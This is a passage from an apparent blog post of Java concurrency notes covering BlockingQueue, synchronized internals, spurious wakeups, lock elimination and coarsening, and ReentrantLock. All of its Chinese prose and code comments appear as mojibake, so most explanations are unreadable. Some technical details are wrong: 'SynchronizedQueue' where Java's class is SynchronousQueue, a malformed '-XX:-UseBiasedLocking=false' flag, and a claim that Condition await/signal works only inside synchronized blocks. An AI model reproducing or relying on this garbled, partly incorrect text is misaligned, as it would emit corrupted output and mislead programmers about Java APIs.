               <span class="comment">// ç­‰åˆ°7ä¸ªç„¶åæ‰§è¡Œsuccess</span></span><br><span class="line">                    success.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (BrokenBarrierException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Semaphore-ç±»"><a href="#Semaphore-ç±»" class="headerlink" title="Semaphore(ç±»)"></a>Semaphore(ç±»)</h3><p>åº•å±‚CAS</p>
<h3 id="ReadWriteLock-æ¥å£"><a href="#ReadWriteLock-æ¥å£" class="headerlink" title="ReadWriteLock(æ¥å£)"></a>ReadWriteLock(æ¥å£)</h3><p>è¯»å¯ä»¥å¤šçº¿ç¨‹åŒæ—¶è¯»,å†™åªèƒ½ä¸€ä¸ªå†™;è¯»é”æ˜¯ä¸ºäº†é˜²æ­¢è¯»çš„æ—¶å€™æœ‰çº¿ç¨‹å†™å…¥; ReentrantReadWriteLock()é»˜è®¤è¯»ä¼˜å…ˆ,å¯¹å†™ä¸å…¬å¹³;</p>
<h3 id="BlockingQueue-æ¥å£"><a href="#BlockingQueue-æ¥å£" class="headerlink" title="BlockingQueue(æ¥å£)"></a>BlockingQueue(æ¥å£)</h3><p>å¤šçº¿ç¨‹,çº¿ç¨‹æ± ä¼šä½¿ç”¨; </p>
<p>add() å¯èƒ½æŠ¥IllegalStateExceptionå¼‚å¸¸, remove() å¯èƒ½æŠ¥NoSuchElementExceptionå¼‚å¸¸,æœ‰è¿”å›å€¼æŠ›å¼‚å¸¸; </p>
<p>offer(), poll()æœ‰è¿”å›å€¼,ä¸æŠ›å¼‚å¸¸ , offer(d, 2,TimeUnit.SECONDS), poll(2, TImeUnit.SECONDS) å¯ä»¥è®¾ç½®ç­‰å¾…æ—¶é—´;</p>
<p> element() peek()è¿”å›é˜Ÿé¦–å…ƒç´ ; </p>
<p> put(), take() ä¼šç­‰å¾…,ç›´åˆ°èƒ½æ“ä½œæˆåŠŸ;  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        ArrayBlockingQueue&lt;Object&gt; objects = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//java.lang.IllegalStateException: Queue full</span></span><br><span class="line"><span class="comment">//java.util.NoSuchElementException</span></span><br></pre></td></tr></table></figure>

<h3 id="SynchronizedQueue-ç±»"><a href="#SynchronizedQueue-ç±»" class="headerlink" title="SynchronizedQueue(ç±»)"></a>SynchronizedQueue(ç±»)</h3><p>æ²¡æœ‰å®¹é‡, è¿›å»ä¸€ä¸ªå…ƒç´ , å¿…é¡»ç­‰å¾…å–å‡ºæ¥ä¹‹å,æ‰èƒ½å†å¾€é‡Œé¢æ”¾ä¸€ä¸ªå…ƒç´ ; put() take(); </p>
<h2 id="Synchronized"><a href="#Synchronized" class="headerlink" title="Synchronized"></a>Synchronized</h2><p><a href="https://blog.csdn.net/u012403290/article/details/64910926">https://blog.csdn.net/u012403290/article/details/64910926</a></p>
<p>å¿…é¡»å¯é‡å…¥ï¼Œä¾‹å¦‚å­ç±»é‡å†™çˆ¶ç±»æ–¹æ³•ï¼Œéƒ½åŠ äº†synchronizedï¼Œè¿™ä¸ªæ—¶å€™å­ç±»æ–¹æ³•é‡Œä¼šè°ƒç”¨superï¼ˆï¼‰æ–¹æ³•ï¼Œå¦‚æœä¸å¯é‡å…¥å°±ä¼šæ­»é”ï¼›æœ€å¥½ä¸è¦é”stringå­—ç¬¦ä¸²ï¼›</p>
<p>jdkæ—©æœŸç‰ˆæœ¬å±äºé‡é‡çº§é”; å¯é‡å…¥é”;JVMå±‚é¢; éå…¬å¹³é”; å†…ç½®å…³é”®å­—,éšå½¢é”;çº¿ç¨‹å¼‚å¸¸æ—¶è‡ªåŠ¨é‡Šæ”¾é”,ä¸ä¼šå‘ç”Ÿæ­»é”; éä¸­æ–­é”,å¿…é¡»ç­‰çº¿ç¨‹æ‰§è¡Œå®Œæ‰é‡Šæ”¾é”; ä»£ç å—åŒæ­¥: é€šè¿‡ä½¿ç”¨monitorenterå’ŒmonitorexitæŒ‡ä»¤å®ç°çš„; åŒæ­¥æ–¹æ³•: ACC_SYNCHRONIZEDä¿®é¥°;æœ‰å¯¹è±¡é”å’Œç±»é”ï¼ˆstaticæ–¹æ³•å’Œclassä¸Šæ·é”ï¼‰åŒºåˆ†ï¼Œä¸¤è€…ä¸å†²çªå¯ä»¥å¹¶è¡Œå­˜åœ¨; </p>
<p>synchronizedå…³é”®å­—ä¸wait()å’Œnotify()&#x2F;notifyAll()æ–¹æ³•ç›¸ç»“åˆå¯ä»¥å®ç°ç­‰å¾…&#x2F;é€šçŸ¥æœºåˆ¶;</p>
<p> wait()å’Œnotify()åªèƒ½åœ¨åŒæ­¥ä»£ç å—ä¸­ä½¿ç”¨;</p>
<p>ç›‘è§†å™¨é”ï¼ˆmonitorï¼‰æ˜¯ä¾èµ–äºåº•å±‚çš„æ“ä½œç³»ç»Ÿçš„ Mutex Lock æ¥å®ç°çš„ï¼ŒJava çš„çº¿ç¨‹æ˜¯æ˜ å°„åˆ°æ“ä½œç³»ç»Ÿçš„åŸç”Ÿçº¿ç¨‹ä¹‹ä¸Šçš„ã€‚å¦‚æœè¦æŒ‚èµ·æˆ–è€…å”¤é†’ä¸€ä¸ªçº¿ç¨‹ï¼Œéƒ½éœ€è¦æ“ä½œç³»ç»Ÿå¸®å¿™å®Œæˆï¼Œè€Œæ“ä½œç³»ç»Ÿå®ç°çº¿ç¨‹ä¹‹é—´çš„åˆ‡æ¢æ—¶éœ€è¦ä»ç”¨æˆ·æ€è½¬æ¢åˆ°å†…æ ¸æ€ï¼Œè¿™ä¸ªçŠ¶æ€ä¹‹é—´çš„è½¬æ¢éœ€è¦ç›¸å¯¹æ¯”è¾ƒé•¿çš„æ—¶é—´ï¼Œæ—¶é—´æˆæœ¬ç›¸å¯¹è¾ƒé«˜ã€‚åº†å¹¸çš„æ˜¯åœ¨ Java 6 ä¹‹å Java å®˜æ–¹å¯¹ä» JVM å±‚é¢å¯¹ synchronized è¾ƒå¤§ä¼˜åŒ–ï¼Œæ‰€ä»¥ç°åœ¨çš„ synchronized é”æ•ˆç‡ä¹Ÿä¼˜åŒ–å¾—å¾ˆä¸é”™äº†.</p>
<h3 id="æ·±å…¥åˆ†æwait-x2F-notifyä¸ºä»€ä¹ˆè¦åœ¨åŒæ­¥å—å†…"><a href="#æ·±å…¥åˆ†æwait-x2F-notifyä¸ºä»€ä¹ˆè¦åœ¨åŒæ­¥å—å†…" class="headerlink" title="æ·±å…¥åˆ†æwait&#x2F;notifyä¸ºä»€ä¹ˆè¦åœ¨åŒæ­¥å—å†…"></a>æ·±å…¥åˆ†æwait&#x2F;notifyä¸ºä»€ä¹ˆè¦åœ¨åŒæ­¥å—å†…</h3><p><a href="https://blog.csdn.net/lsgqjh/article/details/61915074">https://blog.csdn.net/lsgqjh/article/details/61915074</a></p>
<p>notifyä¸é‡Šæ”¾é”ï¼Œå¾—è®©ä½ è‡ªå·±waité‡Šæ”¾é”ï¼Œæ‰èƒ½notify</p>
<p>Java API å¼ºåˆ¶è¦æ±‚è¿™æ ·åšï¼Œå¦‚æœä½ ä¸è¿™ä¹ˆåšï¼Œä½ çš„ä»£ç ä¼šæŠ›å‡ºIllegalMonitorStateException å¼‚å¸¸ã€‚è¿˜æœ‰ä¸€ä¸ªåŸå› æ˜¯ä¸ºäº†é¿å… wait å’Œ notifyä¹‹é—´äº§ç”Ÿç«æ€æ¡ä»¶,ç”Ÿäº§è€…çº¿ç¨‹å‘ç¼“å†²åŒºä¸­å†™å…¥æ•°æ®ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä»ç¼“å†²åŒºä¸­è¯»å–æ•°æ®ã€‚æ¶ˆè´¹è€…çº¿ç¨‹éœ€è¦ç­‰å¾…ç›´åˆ°ç”Ÿäº§è€…çº¿ç¨‹å®Œæˆä¸€æ¬¡å†™å…¥æ“ä½œã€‚</p>
<p>ç”Ÿäº§è€…çº¿ç¨‹éœ€è¦ç­‰å¾…æ¶ˆè´¹è€…çº¿ç¨‹å®Œæˆä¸€æ¬¡è¯»å–æ“ä½œã€‚å‡è®¾wait(),notify(),notifyAll()æ–¹æ³•ä¸éœ€è¦åŠ é”å°±èƒ½å¤Ÿè¢«è°ƒç”¨ã€‚æ­¤æ—¶æ¶ˆè´¹è€…çº¿ç¨‹è°ƒç”¨wait()æ­£åœ¨è¿›å…¥çŠ¶æ€å˜é‡çš„ç­‰å¾…é˜Ÿåˆ—(è¯‘è€…æ³¨:å¯èƒ½è¿˜æœªè¿›å…¥)ã€‚åœ¨åŒä¸€æ—¶åˆ»ï¼Œç”Ÿäº§è€…çº¿ç¨‹è°ƒç”¨notify()æ–¹æ³•æ‰“ç®—å‘æ¶ˆè´¹è€…çº¿ç¨‹é€šçŸ¥çŠ¶æ€æ”¹å˜ã€‚é‚£ä¹ˆæ­¤æ—¶æ¶ˆè´¹è€…çº¿ç¨‹å°†é”™è¿‡è¿™ä¸ªé€šçŸ¥å¹¶ä¸€ç›´é˜»å¡ã€‚å› æ­¤ï¼Œå¯¹è±¡çš„wait(),notify(),notifyAll()æ–¹æ³•å¿…é¡»åœ¨è¯¥å¯¹è±¡çš„åŒæ­¥æ–¹æ³•æˆ–åŒæ­¥ä»£ç å—ä¸­è¢«äº’æ–¥åœ°è°ƒç”¨ã€‚</p>
<h3 id="è™šå‡å”¤é†’é—®é¢˜"><a href="#è™šå‡å”¤é†’é—®é¢˜" class="headerlink" title="è™šå‡å”¤é†’é—®é¢˜"></a>è™šå‡å”¤é†’é—®é¢˜</h3><p>å½“ä¸€ä¸ªæ¡ä»¶æ»¡è¶³æ—¶ï¼Œå¾ˆå¤šçº¿ç¨‹éƒ½è¢«å”¤é†’äº†ï¼Œä½†æ˜¯åªæœ‰å…¶ä¸­éƒ¨åˆ†æ˜¯æœ‰ç”¨çš„å”¤é†’ï¼Œå…¶å®ƒçš„å”¤é†’éƒ½æ˜¯æ— ç”¨åŠŸï¼›<br>æ¯”å¦‚ä¹°è´§ï¼šå¦‚æœå•†å“æœ¬æ¥æ²¡æœ‰è´§ç‰©ï¼Œçªç„¶è¿›äº†ä¸€ä»¶å•†å“ï¼Œè¿™æ˜¯æ‰€æœ‰çš„çº¿ç¨‹éƒ½è¢«å”¤é†’äº†ï¼Œä½†æ˜¯åªèƒ½ä¸€ä¸ªäººä¹°ï¼Œæ‰€ä»¥å…¶ä»–äººéƒ½æ˜¯å‡å”¤é†’ï¼Œè·å–ä¸åˆ°å¯¹è±¡çš„é”ï¼›</p>
<h4 id="è™šå‡å”¤é†’æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ"><a href="#è™šå‡å”¤é†’æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ" class="headerlink" title="è™šå‡å”¤é†’æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ"></a>è™šå‡å”¤é†’æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Ÿ</h4><p>ã€€ã€€æŠŠ while (number !&#x3D; 0) {}</p>
<p>ã€€ã€€æ¢æˆ if (number &#x3D;&#x3D; 0) {}</p>
<p>ã€€ã€€å°±ä¼šå‡ºç°è™šå‡å”¤é†’ã€‚å®˜æ–¹æ–‡æ¡£æœ‰æ ‡æ³¨ï¼›</p>
<h4 id="ä¸ºä»€ä¹ˆifåˆ¤æ–­ä¼šå‡ºç°è™šå‡å”¤é†’ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆifåˆ¤æ–­ä¼šå‡ºç°è™šå‡å”¤é†’ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆifåˆ¤æ–­ä¼šå‡ºç°è™šå‡å”¤é†’ï¼Ÿ"></a>ä¸ºä»€ä¹ˆifåˆ¤æ–­ä¼šå‡ºç°è™šå‡å”¤é†’ï¼Ÿ</h4><p>  ã€€ã€€1. å› ä¸ºifåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œæ‰§è¡Œå®Œä¼šæ¥ç€å‘ä¸‹æ‰§è¡Œifï¼ˆï¼‰å¤–è¾¹çš„</p>
<pre><code>    ã€€ã€€2. è€Œwhileä¸ä¼šï¼Œç›´åˆ°æ¡ä»¶æ»¡è¶³æ‰ä¼šå‘ä¸‹æ‰§è¡Œwhileï¼ˆï¼‰å¤–è¾¹çš„
</code></pre>
<h3 id="8é”ç°è±¡-å…³äºé”çš„8ä¸ªé—®é¢˜"><a href="#8é”ç°è±¡-å…³äºé”çš„8ä¸ªé—®é¢˜" class="headerlink" title="8é”ç°è±¡(å…³äºé”çš„8ä¸ªé—®é¢˜)"></a>8é”ç°è±¡(å…³äºé”çš„8ä¸ªé—®é¢˜)</h3><h3 id="synchronizedä¼˜åŒ–"><a href="#synchronizedä¼˜åŒ–" class="headerlink" title="synchronizedä¼˜åŒ–"></a>synchronizedä¼˜åŒ–</h3><p>é”çš„å››ç§çŠ¶æ€: æ— é”çŠ¶æ€,åå‘é”çŠ¶æ€,è½»é‡çº§é”çŠ¶æ€,é‡é‡çº§é”;é”å¯ä»¥å‡çº§,ä½†ä¸èƒ½é™çº§;</p>
<p>åå‘é”æ˜¯é’ˆå¯¹äºä¸€ä¸ªçº¿ç¨‹è€Œè¨€çš„, çº¿ç¨‹è·å¾—é”ä¹‹åå°±ä¸ä¼šå†æœ‰è§£é”ç­‰æ“ä½œäº†,å‡å¦‚æœ‰ä¸¤ä¸ªçº¿ç¨‹æ¥ç«äº‰è¯¥é”çš„è¯, é‚£ä¹ˆåå‘é”å°±å¤±æ•ˆäº†, è¿›è€Œå‡çº§æˆè½»é‡çº§é”äº†.å› ä¸ºå¤§éƒ¨åˆ†æƒ…å†µä¸‹, éƒ½ä¼šæ˜¯åŒä¸€ä¸ªçº¿ç¨‹è¿›å…¥åŒä¸€å—åŒæ­¥ä»£ç å—çš„. è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¼šæœ‰åå‘é”å‡ºç°çš„åŸå› .åœ¨Jdk1.6ä¸­, åå‘é”çš„å¼€å…³æ˜¯é»˜è®¤å¼€å¯çš„, é€‚ç”¨äºåªæœ‰ä¸€ä¸ªçº¿ç¨‹è®¿é—®åŒæ­¥å—çš„åœºæ™¯. -XX:BiasedLockingStartupDelay&#x3D;0æ¥å…³é—­åå‘é”çš„å¯åŠ¨å»¶è¿Ÿ, ä¹Ÿå¯ä»¥ä½¿ç”¨-XX:-UseBiasedLocking&#x3D;falseæ¥å…³é—­åå‘é”, é‚£ä¹ˆç¨‹åºä¼šç›´æ¥è¿›å…¥è½»é‡çº§é”çŠ¶æ€.</p>
<p>è½»é‡çº§é”: CASæ€æƒ³;ç«äº‰çš„çº¿ç¨‹ä¸ä¼šé˜»å¡, æé«˜äº†ç¨‹åºçš„å“åº”é€Ÿåº¦;å¦‚æœå§‹ç»ˆå¾—ä¸åˆ°é”ç«äº‰çš„çº¿ç¨‹, ä½¿ç”¨è‡ªæ—‹ä¼šæ¶ˆè€—CPU;</p>
<p>é‡é‡çº§é”: çº¿ç¨‹ç«äº‰ä¸é€‚ç”¨è‡ªæ—‹, ä¸ä¼šæ¶ˆè€—CPU;çº¿ç¨‹å µå¡, å“åº”æ—¶é—´ç¼“æ…¢</p>
<h4 id="é”æ¶ˆé™¤"><a href="#é”æ¶ˆé™¤" class="headerlink" title="é”æ¶ˆé™¤"></a>é”æ¶ˆé™¤</h4><p>é”æ¶ˆé™¤æ˜¯æŒ‡å¯¹äºè¢«æ£€æµ‹å‡ºä¸å¯èƒ½å­˜åœ¨ç«äº‰çš„å…±äº«æ•°æ®çš„é”è¿›è¡Œæ¶ˆé™¤ã€‚<br>é”æ¶ˆé™¤ä¸»è¦æ˜¯é€šè¿‡é€ƒé€¸åˆ†ææ¥æ”¯æŒï¼Œå¦‚æœå †ä¸Šçš„å…±äº«æ•°æ®ä¸å¯èƒ½é€ƒé€¸å‡ºå»è¢«å…¶å®ƒçº¿ç¨‹è®¿é—®åˆ°ï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠå®ƒä»¬å½“æˆç§æœ‰æ•°æ®å¯¹å¾…ï¼Œä¹Ÿå°±å¯ä»¥å°†å®ƒä»¬çš„é”è¿›è¡Œæ¶ˆé™¤ã€‚å¯¹äºä¸€äº›çœ‹èµ·æ¥æ²¡æœ‰åŠ é”çš„ä»£ç ï¼Œå…¶å®éšå¼çš„åŠ äº†å¾ˆå¤šé”ã€‚ä¾‹å¦‚ä¸‹é¢çš„å­—ç¬¦ä¸²æ‹¼æ¥ä»£ç å°±éšå¼åŠ äº†é”ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">concatString</span><span class="params">(String s1, String s2, String s3)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> s1 + s2 + s3; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// String æ˜¯ä¸€ä¸ªä¸å¯å˜çš„ç±»ï¼Œç¼–è¯‘å™¨ä¼šå¯¹ String çš„æ‹¼æ¥è‡ªåŠ¨ä¼˜åŒ–ã€‚åœ¨ JDK 1.5 ä¹‹å‰ï¼Œä¼šè½¬åŒ–ä¸º StringBuffer å¯¹è±¡çš„è¿ç»­ append() æ“ä½œï¼š</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">concatString</span><span class="params">(String s1, String s2, String s3)</span> &#123; </span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(); </span><br><span class="line">    sb.append(s1); </span><br><span class="line">    sb.append(s2); </span><br><span class="line">    sb.append(s3); </span><br><span class="line">    <span class="keyword">return</span> sb.toString(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ¯ä¸ª append() æ–¹æ³•ä¸­éƒ½æœ‰ä¸€ä¸ªåŒæ­¥å—ã€‚è™šæ‹Ÿæœºè§‚å¯Ÿå˜é‡ sbï¼Œå¾ˆå¿«å°±ä¼šå‘ç°å®ƒçš„åŠ¨æ€ä½œç”¨åŸŸè¢«é™åˆ¶åœ¨ concatString() æ–¹æ³•å†…éƒ¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œsb çš„æ‰€æœ‰å¼•ç”¨æ°¸è¿œä¸ä¼šé€ƒé€¸åˆ° concatString() æ–¹æ³•ä¹‹å¤–ï¼Œå…¶ä»–çº¿ç¨‹æ— æ³•è®¿é—®åˆ°å®ƒï¼Œå› æ­¤å¯ä»¥è¿›è¡Œæ¶ˆé™¤ã€‚</span></span><br></pre></td></tr></table></figure>

<h4 id="é”ç²—åŒ–"><a href="#é”ç²—åŒ–" class="headerlink" title="é”ç²—åŒ–"></a>é”ç²—åŒ–</h4><p>å¦‚æœä¸€ç³»åˆ—çš„è¿ç»­æ“ä½œéƒ½å¯¹åŒä¸€ä¸ªå¯¹è±¡åå¤åŠ é”å’Œè§£é”ï¼Œé¢‘ç¹çš„åŠ é”æ“ä½œå°±ä¼šå¯¼è‡´æ€§èƒ½æŸè€—ã€‚<br>ä¸Šä¸€èŠ‚çš„ç¤ºä¾‹ä»£ç ä¸­è¿ç»­çš„ append() æ–¹æ³•å°±å±äºè¿™ç±»æƒ…å†µã€‚å¦‚æœè™šæ‹Ÿæœºæ¢æµ‹åˆ°ç”±è¿™æ ·çš„ä¸€ä¸²é›¶ç¢çš„æ“ä½œéƒ½å¯¹åŒä¸€ä¸ªå¯¹è±¡åŠ é”ï¼Œå°†ä¼šæŠŠåŠ é”çš„èŒƒå›´æ‰©å±•ï¼ˆç²—åŒ–ï¼‰åˆ°æ•´ä¸ªæ“ä½œåºåˆ—çš„å¤–éƒ¨ã€‚å¯¹äºä¸Šä¸€èŠ‚çš„ç¤ºä¾‹ä»£ç å°±æ˜¯æ‰©å±•åˆ°ç¬¬ä¸€ä¸ª append() æ“ä½œä¹‹å‰ç›´è‡³æœ€åä¸€ä¸ª append() æ“ä½œä¹‹åï¼Œè¿™æ ·åªéœ€è¦åŠ é”ä¸€æ¬¡å°±å¯ä»¥äº†ã€‚</p>
<h2 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h2><p>conditonä»£æ›¿å¯¹è±¡ç›‘è§†å™¨; await , signal,åªèƒ½åœ¨åŒæ­¥ä»£ç å—ä¸­ä½¿ç”¨;</p>
<h2 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h2><p>æ˜¾æ€§é”,å¯é‡å…¥é”; JDK å±‚é¢å®ç°çš„ï¼ˆä¹Ÿå°±æ˜¯ API å±‚é¢ï¼Œéœ€è¦ lock() å’Œ unlock() æ–¹æ³•é…åˆ try&#x2F;finally è¯­å¥å—æ¥å®Œæˆ); ç­‰å¾…å¯ä¸­æ–­; å¯å®ç°å…¬å¹³é”(é»˜è®¤æ˜¯éå…¬å¹³çš„); åº•å±‚æ˜¯CASä¹è§‚é”ï¼Œä¾èµ–AbstractQueuedSynchronizerç±»ï¼ŒæŠŠæ‰€æœ‰çš„è¯·æ±‚çº¿ç¨‹æ„æˆä¸€ä¸ªCLHé˜Ÿåˆ—ã€‚è€Œå¯¹è¯¥é˜Ÿåˆ—çš„æ“ä½œå‡é€šè¿‡Lock-Freeï¼ˆCASï¼‰æ“ä½œ; é€‚åˆé”å¤§é‡çš„ä»£ç å—;</p>
<h2 id="å¯é‡å…¥é”ã€è¯»å†™é”ã€å…¬å¹³é”ã€å¯ä¸­æ–­é”"><a href="#å¯é‡å…¥é”ã€è¯»å†™é”ã€å…¬å¹³é”ã€å¯ä¸­æ–­é”" class="headerlink" title="å¯é‡å…¥é”ã€è¯»å†™é”ã€å…¬å¹³é”ã€å¯ä¸­æ–­é”"></a>å¯é‡å…¥é”ã€è¯»å†™é”ã€å…¬å¹³é”ã€å¯ä¸­æ–­é”</h2><h5 id="å¯é‡å…¥é”"><a href="#å¯é‡å…¥é”" class="headerlink" title="å¯é‡å…¥é”"></a>å¯é‡å…¥é”</h5><p>Synchronizedå’ŒReentrantLookéƒ½æ˜¯å¯é‡å…¥é”ï¼Œé”çš„å¯é‡å…¥æ€§æ ‡æ˜äº†é”æ˜¯é’ˆå¯¹çº¿ç¨‹åˆ†é…æ–¹å¼è€Œä¸æ˜¯é’ˆå¯¹æ–¹æ³•ã€‚ä¾‹å¦‚è°ƒç”¨Synchronizedæ–¹æ³•Aä¸­å¯ä»¥è°ƒç”¨Synchronizedæ–¹æ³•Bï¼Œè€Œä¸éœ€è¦é‡æ–°ç”³è¯·é”ã€‚</p>
<h5 id="è¯»å†™é”"><a href="#è¯»å†™é”" class="headerlink" title="è¯»å†™é”"></a>è¯»å†™é”</h5><p>æŒ‰ç…§æ•°æ®åº“äº‹åŠ¡éš”ç¦»ç‰¹æ€§çš„ç±»æ¯”è¯»å†™é”ï¼Œåœ¨è®¿é—®ç»Ÿä¸€ä¸ªèµ„æºï¼ˆä¸€ä¸ªæ–‡ä»¶ï¼‰çš„æ—¶å€™ï¼Œä½¿ç”¨è¯»é”æ¥ä¿è¯å¤šçº¿ç¨‹å¯ä»¥åŒæ­¥è¯»å–èµ„æºã€‚ReadWriteLockæ˜¯ä¸€ä¸ªè¯»å†™é”ï¼Œé€šè¿‡readLock()è·å–è¯»é”ï¼Œé€šè¿‡writeLock()è·å–å†™é”ã€‚</p>
<h5 id="å¯ä¸­æ–­é”"><a href="#å¯ä¸­æ–­é”" class="headerlink" title="å¯ä¸­æ–­é”"></a>å¯ä¸­æ–­é”</h5><p>å¯ä¸­æ–­æ˜¯æŒ‡é”æ˜¯å¯ä»¥è¢«ä¸­æ–­çš„ï¼ŒSynchronizedå†…ç½®é”æ˜¯ä¸å¯ä¸­æ–­é”ï¼ŒReentrantLockå¯ä»¥é€šè¿‡lockInterruptiblyæ–¹æ³•ä¸­æ–­æ˜¾æ€§é”ã€‚ä¾‹å¦‚çº¿ç¨‹Båœ¨ç­‰å¾…ç­‰å¾…çº¿ç¨‹Aé‡Šæ”¾é”ï¼Œä½†æ˜¯çº¿ç¨‹Bç”±äºç­‰å¾…æ—¶é—´å¤ªä¹…ï¼Œå¯ä»¥ä¸»åŠ¨ä¸­æ–­ç­‰å¾…é”ã€‚</p>
<h5 id="å…¬å¹³é”"><a href="#å…¬å¹³é”" class="headerlink" title="å…¬å¹³é”"></a>å…¬å¹³é”</h5><p>å¤šä¸ªçº¿ç¨‹æŒ‰ç…§ç”³è¯·é”çš„é¡ºåºå»è·å¾—é”ï¼Œçº¿ç¨‹ä¼šç›´æ¥è¿›å…¥é˜Ÿåˆ—å»æ’é˜Ÿï¼Œæ°¸è¿œéƒ½æ˜¯é˜Ÿåˆ—çš„ç¬¬ä¸€ä½æ‰èƒ½å¾—åˆ°é”ã€‚synchronizedéšæ€§é”æ˜¯éå…¬å¹³é”ï¼Œå®ƒæ— æ³•ä¿è¯ç­‰å¾…çš„çº¿ç¨‹è·å–é”çš„é¡ºåºï¼ŒReentrantLookå¯ä»¥è‡ªå·±æ§åˆ¶æ˜¯å¦å…¬å¹³é”ã€‚å…¬å¹³é”å…ˆæ¥ååˆ°,å¯¹çŸ­ä»»åŠ¡ä¸å‹å¥½,æ‰€ä»¥é»˜è®¤éå…¬å¹³é”,å¯ä»¥æ’é˜Ÿ; </p>
<p>ä¼˜ç‚¹ï¼šæ‰€æœ‰çš„çº¿ç¨‹éƒ½èƒ½å¾—åˆ°èµ„æºï¼Œä¸ä¼šé¥¿æ­»åœ¨é˜Ÿåˆ—ä¸­ã€‚</p>
<p>ç¼ºç‚¹ï¼šååé‡ä¼šä¸‹é™å¾ˆå¤šï¼Œé˜Ÿåˆ—é‡Œé¢é™¤äº†ç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼Œå…¶ä»–çš„çº¿ç¨‹éƒ½ä¼šé˜»å¡ï¼Œcpuå”¤é†’é˜»å¡çº¿ç¨‹çš„å¼€é”€ä¼šå¾ˆå¤§, å¯¹çŸ­ä»»åŠ¡ä¸å‹å¥½;</p>
<h5 id="éå…¬å¹³é”"><a href="#éå…¬å¹³é”" class="headerlink" title="éå…¬å¹³é”"></a>éå…¬å¹³é”</h5><p>å¤šä¸ªçº¿ç¨‹å»è·å–é”çš„æ—¶å€™, ä¼šç›´æ¥å»å°è¯•è·å–,è·å–ä¸åˆ°,å†å»è¿›å…¥åˆ°ç­‰å¾…é˜Ÿåˆ—, å¦‚æœèƒ½è·å–åˆ°, å°±ç›´æ¥è·å–åˆ°é”.</p>
<p>ä¼˜ç‚¹:  å¯ä»¥å‡å°‘CPUå”¤é†’çº¿ç¨‹çš„å¼€é”€, æ•´ä½“çš„ååæ•ˆç‡ä¼šé«˜ç‚¹, CPUä¹Ÿä¸å¿…å”¤é†’æ‰€æœ‰çº¿ç¨‹, ä¼šå‡å°‘å”¤èµ·çº¿ç¨‹çš„æ•°é‡;</p>
<p>ç¼ºç‚¹:  å®¹æ˜“é¥¿æ­», å¯èƒ½ä¼šå¯¼è‡´çº¿ç¨‹ä¸­é—´çš„çº¿ç¨‹ä¸€ç›´è·å–ä¸åˆ°é”æˆ–è€…é•¿æ—¶é—´è·å–ä¸åˆ°é”,å¯¼è‡´é¥¿æ­».è¿™ä¹ˆå¤šä¸ªçº¿ç¨‹åº”caså»å°è¯•ä¼šæµªè´¹cpu;</p>
<h2 id="Synchronizedå’ŒLockæ¯”è¾ƒ"><a href="#Synchronizedå’ŒLockæ¯”è¾ƒ" class="headerlink" title="Synchronizedå’ŒLockæ¯”è¾ƒ"></a>Synchronizedå’ŒLockæ¯”è¾ƒ</h2><ul>
<li>Synchronizedæ˜¯å…³é”®å­—ï¼Œå†…ç½®è¯­è¨€å®ç°ï¼ŒLockæ˜¯æ¥å£ã€‚</li>
<li>Synchronizedåœ¨çº¿ç¨‹å‘ç”Ÿå¼‚å¸¸æ—¶ä¼šè‡ªåŠ¨é‡Šæ”¾é”ï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿå¼‚å¸¸æ­»é”ã€‚Lockå¼‚å¸¸æ—¶ä¸ä¼šè‡ªåŠ¨é‡Šæ”¾é”ï¼Œæ‰€ä»¥éœ€è¦åœ¨finallyä¸­å®ç°é‡Šæ”¾é”ã€‚</li>
<li>Lockæ˜¯å¯ä»¥ä¸­æ–­é”ï¼ŒSynchronizedæ˜¯éä¸­æ–­é”ï¼Œå¿…é¡»ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæˆé‡Šæ”¾é”ã€‚</li>
<li>Lockå¯ä»¥ä½¿ç”¨è¯»é”æé«˜å¤šçº¿ç¨‹è¯»æ•ˆç‡ã€‚</li>
</ul>
